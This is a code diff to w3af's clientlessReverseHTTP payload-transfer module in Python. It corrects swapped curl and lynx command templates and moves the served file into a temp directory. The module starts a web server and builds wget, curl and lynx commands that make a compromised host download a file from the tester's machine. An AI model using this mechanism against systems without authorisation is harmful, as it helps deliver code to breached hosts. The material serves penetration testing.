@@ -24,9 +24,12 @@ import core.controllers.outputManager as om
 from core.controllers.w3afException import *
 from core.data.fuzzer.fuzzer import *
 from core.controllers.payloadTransfer.basePayloadTransfer import basePayloadTransfer as basePayloadTransfer
-import os
+
 from core.controllers.daemons.webserver import webserver
+from core.controllers.misc.temp_dir import get_temp_dir
+
 import time
+import os
 
 class clientlessReverseHTTP( basePayloadTransfer ):
     '''
@@ -73,18 +76,18 @@ class clientlessReverseHTTP( basePayloadTransfer ):
         
         commandTemplates = {}
         commandTemplates['wget'] = 'wget http://%s:%s/%s -O %s'
-        commandTemplates['curl'] = 'lynx -source http://%s:%s/%s > %s'
-        commandTemplates['lynx'] = 'curl http://%s:%s/%s > %s'
+        commandTemplates['lynx'] = 'lynx -source http://%s:%s/%s > %s'
+        commandTemplates['curl'] = 'curl http://%s:%s/%s > %s'
         
         # Create the file
         filename = createRandAlpha( 10 )
-        filePath = 'webroot' + os.path.sep + filename
+        filePath = get_temp_dir() + os.path.sep + filename
         f = file( filePath, 'w' )
         f.write( strObject )
         f.close()
         
         # Start a web server on the inbound port and create the file that will be fetched by the compromised host
-        _wS = webserver( cf.cf.getData( 'localAddress' ), self._inboundPort , 'webroot' + os.path.sep)
+        _wS = webserver( cf.cf.getData( 'localAddress' ), self._inboundPort , get_temp_dir() + os.path.sep)
         _wS.start2()
         time.sleep(0.2) # wait for webserver thread to start
         
